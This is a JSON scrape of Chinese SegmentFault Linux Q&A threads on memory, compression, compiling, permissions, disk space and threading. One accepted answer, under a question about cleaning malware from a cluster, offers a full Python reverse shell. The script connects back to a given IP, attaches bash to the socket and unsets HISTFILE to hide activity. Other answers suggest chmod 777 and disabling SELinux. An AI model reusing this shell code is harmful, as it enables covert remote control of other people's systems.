      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000001721421\">\n<p>关于第一个问题，你可以看看这个 <a href=\"http://segmentfault.com/q/1010000000764237/a-1020000000765793\" rel=\"nofollow\">SF 答案</a>，应该说的很清楚了。简单地说，内存并没有真正被用掉，而是被系统缓存起来了，随时可以被释放出来使用。</p>\n<p>关于第二个问题，简单回答是 Linux 下面的程序都比较有节操，没有节操的程序已经没人用了。如果 Windows 里面没有那么多的 XX 卫士或 XX 助手的话，仅仅一个裸操作系统加上一些必要的程序，并且使用 SSD，也不会有什么卡顿的感觉。</p>\n</div>",
      "attention": "22",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000001718143\">\n<p>Linux 的内存显示经常会出现 90% 多已被使用，但系统依旧很流畅的情况，想知道：</p>\n<ol>\n<li>有时候 CPU 占用率很低，但内存占用率很高，内存都被怎么用掉了？</li>\n<li>系统依旧流畅，不会像 Windows 卡成翔，原理在哪里？</li>\n</ol>\n</div>",
      "favourite": "5",
      "glance": "7.7k",
      "tags": [
        "linux",
        "内存管理"
      ],
      "time": "2014-11-17",
      "title": "Linux 内存占用总是很高为何依旧很流畅？",
      "url": "https://segmentfault.com/q/1010000001718143"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002457147\">\n<p><a href=\"https://tinyjpg.com/\" rel=\"nofollow\">https://tinyjpg.com/</a><br>\n这货可以把一张780kb的黑白jpg在分辨率不变的情况下压到500多kb，想对服务器上的jpg图片批量进行这个操作，可惜没找到合适的本地版本。<br>\n找了好几个试了下，最高的jpegtran也只压到了732kb。而jpegoptim只能压缩不到3%。<br>\ntinyjpg本身提供API，不过我要操作的图片数远远超过Free plan，总不能每月处理一部分吧。。。<br>\n大部分是黑白图，小部分彩色，格式全为jpg。需求是在分辨率不变、清晰度变化不大的情况下尽量压缩大小。<br>\nLinux下有这类工具吗？求推荐。</br></br></br></br></br></p>\n</div>",
      "favourite": "2",
      "glance": "1.5k",
      "tags": [
        "linux",
        "jpg",
        "optimization"
      ],
      "time": "2015-01-02",
      "title": "Linux下有什么可以达到tinyjpg效果的jpg压缩软件吗",
      "url": "https://segmentfault.com/q/1010000002457147"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002689774\">\n<p>今天尝试了下linux的epoll，使用的是默认的水平触发模式，遇到了奇怪的read阻塞问题，因为对底层不了解，一直解决不了。</p>\n<p>麻烦各位了！</p>\n<p>这是原问题的地址：<br><a href=\"http://stackoverflow.com/questions/29727210/why-does-the-read-block-in-this-caselinux-epoll\" rel=\"nofollow\">stackoverflow 问题链接</a></br></p>\n</div>",
      "favourite": "1",
      "glance": "928",
      "tags": [
        "linux",
        "unix",
        "c",
        "epoll",
        "io"
      ],
      "time": "2015-04-19",
      "title": "为什么这种情况下read()会阻塞？（Linux epoll）",
      "url": "https://segmentfault.com/q/1010000002689774"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003509338\">\n<p>比自己配置的安全 因为他们都做了脚本限制了</p>\n<p>你就放心使用吧 不安全只有代码 和你 配置的运行权限</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003509373\">\n<p>别人部署的都比较乱，自己搞不是更好</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003510399\">\n<p><a href=\"http://help.aliyun.com/knowledge_detail.htm?spm=5176.7114037.1996646101.1.D6d9CW&amp;knowledgeId=5974333&amp;pos=1\">阿里云一键安装</a></p>\n<p>有几个链接可以换成内网的，可以看看这篇<br><a href=\"http://blog.csdn.net/oo123ooiiiii/article/details/24803663\">http://blog.csdn.net/oo123ooiiiii/article/details/24803663</a></br></p>\n</div>",
      "attention": "12",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003509242\">\n<p>在阿里云部署正式的线上环境时，使用类似LNMP( <a href=\"http://lnmp.org/install.html\">http://lnmp.org/install.html</a> )或者LNMP2（<a href=\"https://blog.linuxeye.com/31.html\">https://blog.linuxeye.com/31.html</a>）这样的集成包安全嘛？</p>\n<p>大家是怎样解决这个问题的。</p>\n</div>",
      "favourite": "0",
      "glance": "616",
      "tags": [
        "centos",
        "linux"
      ],
      "time": "2015-08-29",
      "title": "阿里云环境部署问题",
      "url": "https://segmentfault.com/q/1010000003509242"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003696828\">\n<p>看下我的方法可不可行：<br>建个screen<br>然后<br>ps aux|grep htral |while read line;do lsof -c htral &gt;&gt; /temp/htral.txt;sleep 30;done</br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003723727\">\n<p>放虚拟机里，启动inotify,启动病毒，记录创建和修改的文件，一般会修改N个常用管理用命令，用包管理命令重新安装这些命令的包。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003696706\">\n<p>既然你诚心诚意低发问了，我就告诉你吧，不用ssh登录，也可以想其他办法获取一个shell啊。</p>\n<p>以下免费赠送。</p>\n<pre><code>#!/usr/bin/python\nimport sys\nimport os\nimport socket\nimport pty\n\nshell = \"/bin/bash\"\n\ndef usage(programname):\n    print \"python connect-back door\"\n    print \"Usage: %s &lt;conn_back_ip&gt; &lt;port&gt;\" % programname\n\ndef main():\n    if len(sys.argv) !=3:\n        usage(sys.argv[0])\n        sys.exit(1)\n\n    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\n    try:\n        s.connect((socket.gethostbyname(sys.argv[1]),int(sys.argv[2])))\n        print \"[+]Connect OK.\"\n    except:\n        print \"[-]Can't connect\"\n        sys.exit(2)\n\n    os.dup2(s.fileno(),0)\n    os.dup2(s.fileno(),1)\n    os.dup2(s.fileno(),2)\n    global shell\n    os.unsetenv(\"HISTFILE\")\n    os.unsetenv(\"HISTFILESIZE\")\n    pty.spawn(shell)\n    s.close()\n\nif __name__ == \"__main__\":\n    main()</code></pre>\n</div>",
      "attention": "14",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003695971\">\n<html><body>\n<p>本人管理者一个不小的linux集群。最近在个别节点上发现了一个名为htral的可疑进程。一直找不到彻底的办法解决，跪求大神支招！！</p>\n<p>该进程的行为表现为：</p>\n<ul>\n<li><p>占用400%的CPU资源</p></li>\n<li><p>一旦有用户ssh登陆到节点，就会在延迟若干秒后自动消失</p></li>\n<li><p>登陆用户退出后，进程又会自动启动</p></li>\n</ul>\n<p>利用ssh登陆到进程消失的短暂时间，我捕获到了进程的pid和打开的文件资源信息</p>\n<p><strong><code>ls -la /proc/$pid/</code>结果：</strong></p>\n<p><img data-src=\"/img/bVpFEf\"/></p>\n<p><strong><code>lsof $pid</code>输出结果：</strong><br><img data-src=\"/img/bVpFEb\"/></br></p>\n<p>现在了解到的情况如下：</p>\n<ol>\n<li><p>有某一个进程一直在检测当前系统的登陆用户，发现无ssh登陆用户的时候，自动拷贝出文件,/usr/share/htral，执行文件，然后删除文件。</p></li>\n<li><p>htral进程会连接11.11.3.22节点的50220端口，传递数据。</p></li>\n<li><p><code>cat /proc/$pid/stat</code> 看到该进程的父进程pid是1</p></li>\n</ol>\n<p>我在<code>11.11.3.22</code>节点上使用<code>netstat -anp | grep 50220</code>命令检测不到任何输出，<code>lsof -i :50220</code>也没有任何结果（用screen登陆，循环执行一段时间后）。</p>\n<p>求助SF上的linux大神们支招，<strong>找出这个恶意进程的根源！！！</strong></p>\n<p><strong>ps: 我现在把进程的源文件拷贝出来了，但不知道怎么分析。</strong></p>\n</body></html>\n</div>",
      "favourite": "1",
      "glance": "1.4k",
      "tags": [
        "linux",
        "linux运维",
        "linux病毒"
      ],
      "time": "2015-09-01",
      "title": "linux集群病毒清理",
      "url": "https://segmentfault.com/q/1010000003695971"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003703901\">\n<p>我用树莓派(一个安装linux的开发板)连接ds18b20温度传感器做小实验，安装好驱动后，发现温度传感器连接树莓派的一个IO引脚后，驱动模块会自动加载，请问linux是怎么探测到传感器连接的呢？<br>是因为探测IO口的电流或电压变化吗？如果是这样是不是有一个线程一直在查询？还是中断实现的？如果是中断实现的，难道那么多IO引脚都注册了中断吗？<br>我对系统内核、驱动不是很了解，所以请大神们能不能通俗的给我讲解一下？</br></br></p>\n</div>",
      "favourite": "1",
      "glance": "973",
      "tags": [
        "linux",
        "linux驱动",
        "raspberry-pi"
      ],
      "time": "2015-09-03",
      "title": "Linux驱动是如何实现热拔插的？",
      "url": "https://segmentfault.com/q/1010000003703901"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003722266\">\n<p>我通过lnamp一键安装的方式同时安装了nginx和apache。现在我不太需要apache，需要卸载，但是网上的方法不靠谱，请问怎么弄呢？我apache是编译好的。</p>\n</div>",
      "favourite": "0",
      "glance": "618",
      "tags": [
        "linux",
        "linux运维"
      ],
      "time": "2015-09-08",
      "title": "linux卸载apache2.4",
      "url": "https://segmentfault.com/q/1010000003722266"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003952625\">\n<html><body><p><img data-src=\"/img/bVqKqa\"/></p></body></html>\n</div>",
      "favourite": "0",
      "glance": "336",
      "tags": [
        "fedora",
        "linux",
        "系统安装"
      ],
      "time": "2015-11-05",
      "title": "fedoraU盘安装出错",
      "url": "https://segmentfault.com/q/1010000003952625"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005042101\">\n<html><body>\n<ol>\n<li><p>用什么语法写?</p></li>\n<li><p>打包放到哪里(share/man?)</p></li>\n<li><p>最佳实践是?</p></li>\n</ol>\n<p><img data-src=\"/img/bVvjQs\"/></p>\n</body></html>\n</div>",
      "favourite": "2",
      "glance": "588",
      "tags": [
        "linux"
      ],
      "time": "5-1",
      "title": "Linux命令行的man文档从写作到呈现在用户面前,经历的过程是怎样的?",
      "url": "https://segmentfault.com/q/1010000005042101"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094590\">\n<p>php-cgi服务只能直接kill掉进程吗？php-cgi没有类似nginx那样的-s stop命令或者mysql的shutdown命令么？我担心直接kill会出现unclean shutdown的情况</p>\n</div>",
      "favourite": "0",
      "glance": "7.2k",
      "tags": [
        "php",
        "linux",
        "shell"
      ],
      "time": "2011-06-10",
      "title": "如何使用shell脚本安全关闭php-cgi服务进程",
      "url": "https://segmentfault.com/q/1010000000094590"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000096381\">\n<p>你新安装了动态链接库，在mcrypt configure之前执行一下<code>ldconfig</code>试试</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000096392\">\n<p>直接用yum吧，直接编译源码的话，会有很多库的依赖，在configure的时候并没有处理好</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000096394\">\n<p>问题解决了，StackOverflow上面的大牛指出，在编译mcrypt之前需要在LDFLAGS中给出-L和-I</p><pre>export LD_LIBRARY_PATH=/home/felix021/lamp/libmcrypt/lib:/home/felix021/lamp/mhash/lib\nexport LDFLAGS=\"-L/home/felix021/lamp/mhash/lib/ -I/home/felix021/lamp/mhash/include/\"\nexport CFLAGS=\"-I/home/felix021/lamp/mhash/include/\"\n./configure --prefix=/home/felix021/lamp/mcrypt/ --with-libmcrypt-prefix=/home/felix021/lamp/libmcrypt</pre><p>参见 <a href=\"http://stackoverflow.com/questions/6383492/cant-compile-mcrypt-configure-failed-mhash-keygen-in-lmhash-no\" rel=\"nofollow\" target=\"_blank\" title=\"http://stackoverflow.com/questions/63...\">http://stackoverflow.com/questions/63...</a></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094627\">\n<p>想自己编译安装php的mcrypt扩展</p><pre># libmcrypt\ntar zxf libmcrypt-2.5.8.tar.gz\ncd libmcrypt-2.5.8\n./configure --prefix=/home/felix021/lamp/libmcrypt/\nmake\nmake install\n\n# mhash\ntar jxf mhash-0.9.9.9.tar.bz2\ncd mhash-0.9.9.9\n./configure --prefix=/home/felix021/lamp/mhash/\nmake\nmake install\n\n# mcrypt\nLD_LIBRARY_PATH=/home/felix021/lamp/libmcrypt/lib:/home/felix021/lamp/mhash/lib\n./configure --prefix=/home/felix021/lamp/mcrypt/ --with-libmcrypt-prefix=/home/felix021/lamp/libmcrypt</pre><p>configure不通过，提示：<br/><blockquote>checking for mhash_keygen in -lmhash... no<br/>configure: error: \"You need at least libmhash 0.8.15 to compile this program. <a href='http://mhash.sf.net/\"' rel=\"nofollow\" target=\"_blank\" title='http://mhash.sf.net/\"'>http://mhash.sf.net/\"</a></blockquote><p>于是专门去找了mhash0.8.18和mhash0.8.15，依然是这个错误。</p><p>查了一下mhash_keygen这个函数，在0.8.15/8中是<br/>\nint mhash_keygen(xxx,xxx,xxx)<br/>\n在 0.9.9.9 中是</p><pre>#if defined(PROTOTYPES)\nmutils_error mhash_keygen(keygenid algorithm, ....)\n#else\nmutils_error mhash_keygen();\n#endif</pre><p>（mutils_error是typedef的uint32）</p><p>而mcrypt的configure里头12114行用来测试的是<br/><pre>char mhash_keygen ();</pre><p>即使把char改成 mutils_error 也还是不行。</p><p>求解。</p>\n</p></p></div>",
      "favourite": "2",
      "glance": "10.5k",
      "tags": [
        "linux",
        "php",
        "mcrypt",
        "mhash"
      ],
      "time": "2011-06-17",
      "title": "编译mcrypt出错，mhash怎么都对不上(已解决)",
      "url": "https://segmentfault.com/q/1010000000094627"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000096383\">\n<p>应该是这个原因，你用<code>chown -rf apache.apache /var/www/html/freechat/data/</code>试试</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000096384\">\n<pre>chmod 777 -R /var/www/html/freechat/data</pre><p>递归修改权限<br/>\n或者向  @joyqi 说的把目录owner改成apache</p><pre>chown -R apache:apache /var/www/html/freechat</pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000096387\">\n<p>问题解决了，竟然是SELinux从中作梗。使用<code>setenforce 0</code>以后便成功了。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094628\">\n<p>我想要在自己的Linux系统下安装一些开源的php应用，譬如phpFreeChat，我把它放在/var/www/html/freechat底下，然后对freechat下的data文件夹中的public和private文件夹使用了<code>chmod 777</code>命令，然后使用<code>ls -al data</code>命令可以看到这样的结果：</p><blockquote>drwxr-xr-x.  4 root root 4096  Jun 17 15:07 .<br/>drwxr-xr-x. 13 root root 4096  Jun 17 15:22 ..<br/>drwxrwxrwx.  2 root root 4096  Jun 17 15:07 private<br/>drwxrwxrwx.  3 root root 4096  Jun 17 15:07 public</blockquote><p>但是在浏览器里输入<a href=\"http://localhost/freechat\" rel=\"nofollow\" target=\"_blank\" title=\"http://localhost/freechat\">http://localhost/freechat</a> 却会得到这样的错误：</p><blockquote>phpFreeChat cannot be initialized, please correct these errors:<br/><br/>/var/www/html/freechat/src/../data/private is not writeable<br/>/var/www/html/freechat/src/../data/private/cache can't be created<br/>/var/www/html/freechat/src/../data/private/cache is not writeable<br/>/var/www/html/freechat/src/../data/private/cache is not readable<br/>cannot create /var/www/html/freechat/src/../data/public/themes/default<br/>cannot create /var/www/html/freechat/src/../data/public/themes/default<br/>/var/www/html/freechat/src/../data/private/chat can't be created<br/>/var/www/html/freechat/src/../data/private/chat is not writeable<br/>/var/www/html/freechat/src/../data/private/chat is not readable<br/>/var/www/html/freechat/src/../data/private/chat/s_d0ba868e1391b6c0d897996049a68ada can't be created<br/>/var/www/html/freechat/src/../data/private/chat/s_d0ba868e1391b6c0d897996049a68ada is not writeable<br/>/var/www/html/freechat/src/../data/private/chat/s_d0ba868e1391b6c0d897996049a68ada is not readable</blockquote><p>还尝试过用递归的chmod命令，错误依旧。</p><p>利用代码</p><pre>&lt;?php echo exec('whoami'); ?&gt;</pre><p>发现用户名是apache，然后在/etc/httpd/conf/httpd.conf里发现User和Group都是apache。请问之所以显示文件不可写是因为这个用户的设置问题吗？如果是的话我该怎么修改？如果不是的话又是什么问题导致的呢？</p>\n</div>",
      "favourite": "0",
      "glance": "6.6k",
      "tags": [
        "linux",
        "httpd",
        "php",
        "apache",
        "file-permission"
      ],
      "time": "2011-06-17",
      "title": "chmod命令之后安装php应用提示文件依然不可写",
      "url": "https://segmentfault.com/q/1010000000094628"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000096573\">\n<p>虽然木有写汇编了，但是前边都有！骄傲的举手！</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000096579\">\n<p>常常用vi修改文件啊~</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000096601\">\n<p>做嵌入式Linux开发，每天都用到。纯C，用ViM看代码，写代码，偶尔需要写Makefile</p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094704\">\n<p>拖起来看看<br/>\nlinux环境下，<br/>\n纯C<br/>\n自己写MAKEFILE<br/>\n用VI管理项目<br/>\n行命令~~~</p><p>有木有？</p><p>偶尔写点汇编<br/>\n但是还不是写驱动的~~~~<br/>\n有木有？</p>\n</div>",
      "favourite": "2",
      "glance": "7k",
      "tags": [
        "linux"
      ],
      "time": "2011-06-30",
      "title": "还有多少人坚持用linux、C、gcc、make、vi？",
      "url": "https://segmentfault.com/q/1010000000094704"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000097808\">\n<p>可以看看是不是有进程一直在写这个目录。<br/>\n如果你的vg还有多余的空间，用这个命令</p><pre>lvextend -L+10G /dev/vg00/lv-102\nresize2fs /dev/vg00/lv-102</pre><p>把lv102扩展一下，然后看是不是还会被迅速填满。</p><pre>du --max-depth=1</pre><p>可以看到当前1级子目录的大小。用这种方法可以定位到是哪个文件在吃空间。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000097815\">\n<p>删除文件时直接用shred</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000097804\">\n<p>首先：<br/>\n查看LVM的一些方法：<br/>\npvscan<br/>\nlvscan<br/>\nlvdisplay -a<br/>\n都是查看LVM相关的情况。<br/>\n查看下/dev/mapper/VolGroup00-LogVo102 这个实际的大小是多少。<br/>\n再有：<br/>\n能否查看下/opt下都有哪些目录占了很大的空间，因为我怀疑你删除的东西 其实不是很大 那么这样的话df -h看到的其实还是100%没有那么精确。<br/>\ncd /opt<br/>\ndu -sh *<br/>\n如果发现某个目录比较大 再进入这个目录一级一级的查看，直到找到真凶。<br/>\n你也可以把每级的情况回复给我 看看。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095311\">\n<p>系统是CentOS 5.7，<strong>df -h</strong>后看到的信息：</p><pre>Filesystem            Size  Used Avail Use% Mounted on\n/dev/mapper/VolGroup00-LogVol00\n                       10G  4.4G  5.1G  47% /\n/dev/mapper/VolGroup00-LogVo102\n                      131G  125G     0 100% /opt\n/dev/sda1              99M   33M   61M  36% /boot\ntmpfs                 501M     0  501M   0% /dev/shm</pre><p>LogVol102的空间占用一直是100%，<code>删除文件后可用空间也不增加，而且已用空间也不减少</code><p>之后我查询资料并尝试了以下方法<br/>\n1. 有人说是有进程在占用被删文件，所以磁盘空间不释放，于是我kill掉使用/opt的所有进程（用lsof | grep \\/opt查看到的进程），但占用空间依然不变<br/>\n2. 之后我卸载此卷(umount /opt)再重新挂载(mount /dev/mapper/VolGroup00-LogVo102 /opt)，df显示的内容还和上边的一样<br/>\n3. 使用fsck /dev/mapper/VolGroup00-LogVo102检查，显示</p><pre>fsck 1.39 (29-May-2006)\ne2fsck 1.39 (29-May-2006)\n/dev/mapper/VolGroup00-LogVo102: clean, 18580/35356672 files, 33631587/35332096 blocks</pre><p>这个我没看明白，但也没提示我修复什么的<br/>\n4. 最终我重启服务器，空间占用情况也依然没有变化<br/>\n以上是我能想到和查到的方法，都没能解决问题，中间我还删过很多文件，但显示的已用空间和可用空间一直没有任何变化。<br/>\n另外，我用fdisk -l看到的分区情况是</p><pre>Disk /dev/sda: 160.0 GB, 160041885696 bytes\n255 heads, 63 sectors/track, 19457 cylinders\nUnits = cylinders of 16065 * 512 = 8225280 bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sda1   *           1          13      104391   83  Linux\n/dev/sda2              14       19457   156183930   8e  Linux LVM</pre><p>/opt应该是LVM的一个卷，但我对LVM这个东西完全不了解，也不知道是不是LVM导致的这个问题</p><p>这台电脑我不想格磁盘再重装，因为上边有很多数据，重装的代价太大。<br/>\n有人知道如何解决这个问题吗，或者有什么建议？在此先谢谢大家了</p>\n</p></div>",
      "favourite": "2",
      "glance": "13.4k",
      "tags": [
        "linux",
        "centos"
      ],
      "time": "2011-12-22",
      "title": "CentOS 下磁盘空间占用一直是100%，无法释放",
      "url": "https://segmentfault.com/q/1010000000095311"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095342\">\n<p>在mac 的“终端.app”中，我有一个ruby脚本想让我的脚本输出的结果信息只在一行显示，同时在行尾显示“1%～100%”例如:<br/>\n【##########】50% 请问有什么方法呢？我的脚本意思是删除某个目录中的所以文件。最主要的是怎么实现这个显示方式.谢谢</p>\n</div>",
      "favourite": "4",
      "glance": "4k",
      "tags": [
        "ruby",
        "ruby-on-rails",
        "linux",
        "unix",
        "shell"
      ],
      "time": "2011-12-30",
      "title": "mac怎么在终端中输入某个脚本执行的进度百分比？",
      "url": "https://segmentfault.com/q/1010000000095342"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000098129\">\n<p>可以用管道执行more命令</p><p>比如：</p><pre>cat aa.txt | more</pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000098131\">\n<p>你是不是指哪些被滚到屏幕上面的部分？可以用shift+pageUp/pageDown进行滚动</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000098130\">\n<p>more<br/>\nless 更好 因为可以像vi一样的查询和上下翻屏 如果想进行vi操盘中要按v就可以 切换到vi 再:q就可以 切回less</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095537\">\n<p>在图形界面下可以通过滚动条来查看超出屏幕显示范围的内容，但是在字符界面下如果超出了屏幕的显示<br/>\n范围，应该怎样查看超出那部分的内容呢？</p><p>应该是我表述不清晰，我的意思是在水平方向上超出了屏幕显示范围，而不是在垂直方向！</p>\n</div>",
      "favourite": "1",
      "glance": "11.5k",
      "tags": [
        "linux"
      ],
      "time": "2012-03-10",
      "title": "linux 在字符界面中如何查看超出屏幕显示范围的内容",
      "url": "https://segmentfault.com/q/1010000000095537"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000126088\">\n<p>也可以使用<a href=\"https://github.com/zpoley/json-command.git\" rel=\"nofollow\" target=\"_blank\" title=\"https://github.com/zpoley/json-comman...\">https://github.com/zpoley/json-comman...</a>，功能更强。但需要node.js</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000173000\">\n<p>Vim中格式化json数据：<br/>\n命令模式下</p><pre>#!python -m json.tool</pre><p>可以映射快捷键，如Ctrl+F6，编辑vimrc：</p><pre>“ Format JSON data using python module json.tool\nmap &lt;C-F6&gt; :#!python -m json.tool&lt;CR&gt;</pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000126077\">\n<p>可以使用python的json.tool！</p><pre>echo '{\"status\":200,\"data\":[{\"id\":1000,\"name\":\"John\"},{\"id\":1004,\"name\":\"Tom\"}]}'|python -mjson.tool</pre><pre>{\n    \"data\": [\n        {\n            \"id\": 1000,\n            \"name\": \"John\"\n        },\n        {\n            \"id\": 1004,\n            \"name\": \"Tom\"\n        }\n    ],\n    \"status\": 200\n}</pre>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000126052\">\n<p>我很喜欢在命令行调试API，返回数据都是JSON格式的。打印出来的内容太痛苦了</p><pre>{\"status\":200,\"data\":[{\"id\":1000,\"name\":\"John\"},{\"id\":1004,\"name\":\"Tom\"}]}</pre><p>有木有工具打印个易读的样式，这样的</p><pre>{\n  \"status\":200,\n  \"data\":\n  [\n    {\n       \"id\":1000,\n       \"name\":\"John\"\n    },\n    {\n       \"id\":1004,\n       \"name\":\"Tom\"\n    }\n  ]\n}</pre>\n</div>",
      "favourite": "5",
      "glance": "4.8k",
      "tags": [
        "linux",
        "命令行",
        "json"
      ],
      "time": "2012-10-10",
      "title": "命令行能不能打印易读的Json数据",
      "url": "https://segmentfault.com/q/1010000000126052"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000131259\">\n<p>Linux下创建了一个用户，这个用户专门用来运行脚本的，但是不想让用户可以ssh登陆。<br/>\n就是可以</p><pre>sudo -u user</pre><p>或</p><pre>su - user</pre><p>但是不可以</p><pre>ssh user@host</pre>\n</div>",
      "favourite": "0",
      "glance": "1.6k",
      "tags": [
        "linux",
        "sudo"
      ],
      "time": "2012-10-23",
      "title": "怎么阻止用户登录，但是可以执行命令",
      "url": "https://segmentfault.com/q/1010000000131259"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000131277\">\n<p>例如下面的例子，能否(如何)区别fn1的两次调用。（与Common Lisp中的函数可选参数相似）<br/>\n我刻意传递了与默认参数相同的值，防止仅仅使用比较值的方法区分。<br/>\nLinux系统，编译器为g++ 4.7.2。可以利用编译器特性。</p><pre>#include &lt;iostream&gt;  \nvoid fn1(int a,int b=10);  \n  \nvoid fn1(int a,int b)  \n{  \n    std::cout&lt;&lt;\"a=\"&lt;&lt;a&lt;&lt;\" b=\"&lt;&lt;b&lt;&lt;std::endl;  \n}  \n  \nint main(void)  \n{  \n    fn1(1);  \n    fn1(1,10);  \n    return 0;  \n}</pre>\n</div>",
      "favourite": "0",
      "glance": "3.2k",
      "tags": [
        "c++",
        "linux",
        "gnu"
      ],
      "time": "2012-10-23",
      "title": "怎么判断C++函数默认参数在调用时是否被赋值(还是使用了默认参数)",
      "url": "https://segmentfault.com/q/1010000000131277"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000132879\">\n<pre>#include &lt;unistd.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;stdio.h&gt;\n\npthread_mutex_t Poll_Work;       //互斥\npthread_cond_t Poll_Full;       //条件\n\nvoid* thread0(void *param)\n{\n\t\n\twhile(*(int*)param &lt; 100 &amp;&amp; *(int*)param &gt;= 0){\n\t\tpthread_mutex_lock(&amp;Poll_Work);\n\t\t(*(int*)param) += 5;\n\t\tprintf(\"Thread0: %d\\n\", *(int*)param);\n\t\tpthread_mutex_unlock(&amp;Poll_Work);\n                sleep(2);\n\t}\n\tpthread_cond_signal(&amp;Poll_Full);\n\treturn NULL;\n}\n\nvoid* thread1(void *param)\n{\n\twhile(*(int*)param &lt; 100 ){\n\t\tpthread_mutex_lock(&amp;Poll_Work);\n\t\t(*(int*)param) -= 5;\n\t\tprintf(\"Thread1: %d\\n\", *(int*)param);\n\t\tpthread_mutex_unlock(&amp;Poll_Work);\n                sleep(2);\n\t}\n\tpthread_cond_signal(&amp;Poll_Full);\n\treturn NULL;\n}\n\nvoid* thread2(void *param)\n{\n\tpthread_mutex_lock(&amp;Poll_Work); \n\twhile(*(int*)param &lt; 100) \n\t\tpthread_cond_wait(&amp;Poll_Full, &amp;Poll_Work); \n\tprintf(\"Thread2: Poll Is Full!!\\n\");  \n\tpthread_mutex_unlock(&amp;Poll_Work); \n\treturn NULL;\n}\n\nint main()\n{\n\tint sum = 0;   //水深  满为100米 初始化 池里没有水\n\tint i;\n\n\tpthread_mutex_init(&amp;Poll_Work, NULL);\n\tpthread_cond_init(&amp;Poll_Full, NULL);\n\tpthread_t ths[3];\n\tpthread_create(&amp;ths[0], NULL,  thread0, (void*)&amp;sum);\n\tpthread_create(&amp;ths[1], NULL,  thread1, (void*)&amp;sum);\n\tpthread_create(&amp;ths[2], NULL,  thread2, (void*)&amp;sum);\n\tfor(i = 0; i &lt; 3; ++ i){\n\t\tpthread_join(ths[i], NULL);\n\t}\n\tprintf(\"Play End!\\n\");\n}</pre><p>程序大概意思 一个可以装100水的pool  两个线程 一个不断加5  一个不断减3  第三个线程用于输出 当满的时候 输出Full   可是运行程序后 发现总是只有一个线程在运行 另一个完全没反应。  加了sleep也不见另一个线程被调度执行。</p><p>为什么呢？</p><p>sleep位置改了也不行~  如上改在解锁后面还是不行。</p>\n</div>",
      "favourite": "0",
      "glance": "4.5k",
      "tags": [
        "linux",
        "多线程"
      ],
      "time": "2012-10-28",
      "title": "linux多线程的调度问题",
      "url": "https://segmentfault.com/q/1010000000132879"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
